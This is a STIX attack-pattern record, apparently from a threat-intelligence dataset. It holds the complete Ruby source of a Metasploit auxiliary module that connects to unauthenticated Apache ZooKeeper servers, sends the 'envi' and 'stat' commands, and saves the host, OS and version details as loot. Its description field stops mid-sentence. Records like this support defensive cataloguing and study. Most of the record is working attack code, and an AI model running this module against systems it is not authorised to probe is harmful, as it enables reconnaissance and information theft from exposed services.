{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0579a646-84ef-4c96-a1ac-183e9d3ea5fd",
    "created": "2024-08-14T16:32:08.382833Z",
    "modified": "2024-08-14T16:32:08.382837Z",
    "name": "Apache ZooKeeper Information Disclosure",
    "description": " Apache ZooKeeper server service runs on TCP 2181 and by default, it is accessible without any authentication. This module targets Apache ZooKeeper service instances to extract information about the system environment, and service statistics.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/zookeeper_info_disclosure.rb",
            "external_id": "zookeeper_info_disclosure.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache ZooKeeper Information Disclosure',\n        'Description' => %q{\n          Apache ZooKeeper server service runs on TCP 2181 and by default, it is accessible without any authentication. This module targets Apache ZooKeeper service instances to extract information about the system environment, and service statistics.\n        },\n        'References' => [\n          ['URL', 'https://zooKeeper.apache.org/doc/current/zookeeperAdmin.html']\n        ],\n        'Author' => [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n        'DisclosureDate' => '2020-10-14',\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => { 'VERBOSE' => true },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(2181),\n        OptInt.new('TIMEOUT', [true, 'Timeout for the probe', 30])\n      ], self.class\n    )\n\n    deregister_options('USERNAME', 'PASSWORD')\n  end\n\n  def run_host(_ip)\n    to = datastore['TIMEOUT'].zero? ? 30 : datastore['TIMEOUT']\n    vprint_status(\"Using a timeout of #{to}...\")\n    begin\n      ::Timeout.timeout(to) do\n        connect\n        print_status('Verifying if service is responsive...')\n        sock.put('ruok')\n        data = sock.get_once(-1, to).to_s\n\n        if data && (data.to_s =~ /imok/ || data.to_s =~ /whitelist/)\n          print_good(\"Service looks fine. Going ahead with extraction..\\n\")\n          sock.close\n\n          connect\n          print_status('Dumping environment info...')\n          sock.put('envi')\n          data = sock.get_once(-1, to).to_s\n\n          if data && (data.to_s !~ /whitelist/)\n            print_good(data.to_s)\n            sock.close\n\n            loot_name = 'environ-log'\n            loot_type = 'text/plain'\n            loot_desc = 'ZooKeeper Environment Log'\n            loot_service = 'ZooKeeper'\n            p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)\n            print_good(\"File saved in: #{p} \\n\")\n\n            version = data.match(/zookeeper.version=\\s*\\S*/).to_s.split('=')[1].split(',')[0]\n            hname = data.match(/host.name=\\s*\\S*/).to_s.split('=')[1]\n            os_type = data.match(/os.name=\\s*\\S*/).to_s.split('=')[1]\n            os_arch = data.match(/os.arch=\\s*\\S*/).to_s.split('=')[1]\n            os_ver = data.match(/os.version=\\s*\\S*/).to_s.split('=')[1]\n            os = \"#{os_type} #{os_arch} #{os_ver}\"\n\n            host_info = {\n              host: rhost,\n              os_name: os_type,\n              name: hname,\n              comments: os\n            }\n            report_host(host_info)\n            report_service(host: rhost, port: rport, name: 'ZooKeeper', info: \"Apache ZooKeeper: #{version}\")\n          else\n            print_error('Server does not allow accessing environment information.')\n            host_info = {\n              host: rhost\n            }\n            report_host(host_info)\n            report_service(host: rhost, port: rport, name: 'ZooKeeper', info: 'Apache ZooKeeper')\n          end\n\n          connect\n          print_status('Dumping statistics about performance and connected clients...')\n          sock.put('stat')\n          data = sock.get_once(-1, to).to_s\n\n          if data && (data.to_s !~ /whitelist/)\n            print_good(data.to_s)\n            sock.close\n\n            loot_name = 'stat-log'\n            loot_type = 'text/plain'\n            loot_desc = 'ZooKeeper Stat Log'\n            loot_service = 'ZooKeeper'\n            p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)\n            print_good(\"File saved in: #{p} \\n\")\n          else\n            print_error('Server does not allow accessing statistics.')\n          end\n        else\n          print_error('No good response from server. Exiting.')\n        end\n      end\n    rescue Timeout::Error, ::Rex::TimeoutError, ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} - Connection Failed...\")\n    ensure\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-10-14"
}